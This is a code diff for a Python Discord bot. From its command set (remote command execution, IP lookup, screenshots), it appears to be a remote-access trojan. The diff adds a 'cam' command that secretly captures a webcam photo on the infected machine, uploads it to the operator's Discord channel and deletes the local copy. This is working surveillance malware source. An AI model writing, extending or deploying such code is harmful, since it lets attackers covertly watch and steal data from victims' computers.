@@ -12,6 +12,7 @@ from datetime import datetime
 from utils.permissions import is_authorized, is_in_session_channel
 from commands.execute_command import execute_command
 from commands.get_ip_info import get_ip_info
+from commands.camera import take_webcam_photo
 
 def register_commands(client):
     @client.command()
@@ -83,7 +84,7 @@ def register_commands(client):
             data = datetime.now()
             hora_formatada = data.strftime("%d/%m/%Y")
             data_formatada = data.strftime("%H:%M:%S")
-            processing_msg = await ctx.send(f"```[+] Screenshot {data_formatada} : {hora_formatada}```")
+            processing_msg = await ctx.send(f"```[+] screenshot {data_formatada} : {hora_formatada}```")
             
             from commands.screenshot import take_screenshot
             
@@ -102,3 +103,29 @@ def register_commands(client):
                 
         except Exception as e:
             await ctx.send(f"```[!] Erro: {str(e)}```")
+
+    @client.command()
+    @is_authorized()
+    @is_in_session_channel()
+    async def cam(ctx):
+        try:
+            data = datetime.now()
+            hora_formatada = data.strftime("%d/%m/%Y")
+            data_formatada = data.strftime("%H:%M:%S")
+            processing_msg = await ctx.send(f"```[+] webcam {data_formatada} : {hora_formatada}```")
+            
+            filepath, error = await asyncio.to_thread(take_webcam_photo)
+            
+            if error:
+                await processing_msg.edit(content=f"```[!] erro ao capturar webcam: {error}```")
+                return
+                
+            await ctx.send(file=discord.File(filepath))
+            
+            try:
+                os.remove(filepath)
+            except:
+                pass
+                
+        except Exception as e:
+            await ctx.send(f"```[!] erro: {str(e)}```")
